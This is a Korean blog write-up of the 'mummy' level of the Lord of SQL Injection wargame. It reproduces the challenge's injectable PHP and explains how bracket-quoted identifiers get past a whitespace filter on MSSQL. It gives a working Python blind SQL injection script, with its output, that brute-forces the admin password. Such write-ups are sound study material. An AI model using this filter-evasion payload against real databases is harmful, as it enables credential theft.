---
title: "[Lord of SQL Injection] LoS - mummy 문제풀이"
date: 2019-08-03
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

이제 거의 다 정리 해 간다.
앞으로 5문제만 더 정리하면 `LoS`에 대한 풀이는 모두 정리가 끝난다.
다음 문제 이름은 `mummy`이다.

<!--more-->

코드는 다음과 같다.  

```php
---------------------------------
query : select
---------------------------------

<?php
  include "./config.php";
  login_chk();
  $db = mssql_connect("mummy");
  if(preg_match('/master|sys|information|;|\(|\//i', $_GET['query'])) exit("No Hack ~_~");
  for($i=0;$i<strlen($_GET['query']);$i++) if(ord($_GET['query'][$i]) <= 32) exit("%01~%20 can used as whitespace at mssql");
  $query = "select".$_GET['query'];
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));
  if($result[0]) echo "<h2>Hello anonymous</h2>";

  $query = "select pw from prob_mummy where id='admin'";
  $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));
  if($result['pw'] === $_GET['pw']) solve("mummy");
  highlight_file(__FILE__);
?>
```

이번 문제도 `id='admin'`일 때의 정확한 `pw`의 값을 알아야 하는 `Blind SQL Injection` 문제이다.
그런데 중간에 보면 다음과 같은 코드가 있다.  

```php
for($i=0;$i<strlen($_GET['query']);$i++) if(ord($_GET['query'][$i]) <= 32)exit("%01~%20 can used as whitespace at mssql");
```

즉, 아스키코드표의 `0x01 ~ 0x20`까지 쓸 수 없다는 것인데, 문제는 이 범위 안에 `Tab(0x09)`, `Line Feed(0x0a)`, `Vertical Tab(0x0b)`, `Carriage Return(0x0d)`, `Space(0x20)`가 모두 들어있다는 것이다.
때문에 쿼리문에서 필수적인 `Whitespace` 문자를 모두 사용할 수가 없다.
그래서 인터넷을 뒤지다가 `[]`를 사용하면 된다는 글을 봤다.
지금 다시 찾으려고 하니 도저히 못찾겠는데, 그땐 있었다.
그때의 나는 검색 능력이 지금보다 뛰어났었나보다 ㅎㅎ
쨌든 `[]`는 아래처럼 사용하면 된다.  

```plain
select'1'from[table]where[column]='a'
```

그래서 문제를 풀기 위해서 위의 `[]`를 이용 해 아래와 같이 소스코드를 구현했다.  

```python
import requests

flag = ""
length = 20

url = "https://los.rubiya.kr/chall/mummy_2e13c2a4483d845ce2d37f7c910f0f83.php?query="
session = dict(PHPSESSID = "YOUT SESSION ID")

print "[+] Start"

print "[+] Find password"

end = False

for j in range(1, length + 1):
        for i in range(48, 128):
                try:
                        query = url + "'1'from[prob_mummy]where[id]='admin'and[pw]like'" + flag + chr(i) + "%'"
                        r = requests.post(query, cookies=session)
                except:
                        print "[-] Error occur"
                        continue

                if 'Hello anonymous' in r.text:
                        flag += chr(i)
                        print "[+] Found " + str(j), ":", flag
                        break
                if i == 127:
                        print "[+] Maybe it's end"
                        end = True
                        break
        if end == True:
                break

print "[+] Found password : ", flag
print "[+] End"
```

그 결과 아래와 같이 결과값을 얻을 수 있다.  

```bash
$ python ex.py 
[+] Start
[+] Find password
[+] Found 1 : 0
[+] Found 2 : 0C
[+] Found 3 : 0C3
[+] Found 4 : 0C3C
[+] Found 5 : 0C3CC
[+] Found 6 : 0C3CC2
[+] Found 7 : 0C3CC24
[+] Found 8 : 0C3CC245
[+] Maybe it's end
[+] Found password :  0C3CC245
[+] End
```

나온 결과값에서 알파벳을 소문자로 바꾸어 아래와 같이 입력하면 문제를 풀 수 있다.  

```plain
?pw=0c3cc245
```

---

```php
--------------------------------
query : select
--------------------------------

MUMMY Clear!

<?php
  include "./config.php";
  login_chk();
  $db = mssql_connect("mummy");
  if(preg_match('/master|sys|information|;|\(|\//i', $_GET['query'])) exit("No Hack ~_~");
  for($i=0;$i<strlen($_GET['query']);$i++) if(ord($_GET['query'][$i]) <= 32) exit("%01~%20 can used as whitespace at mssql");
  $query = "select".$_GET['query'];
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));
  if($result[0]) echo "<h2>Hello anonymous</h2>";

  $query = "select pw from prob_mummy where id='admin'";
  $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));
  if($result['pw'] === $_GET['pw']) solve("mummy");
  highlight_file(__FILE__);
?>
```

---

```plain
MUMMY Clear!!
```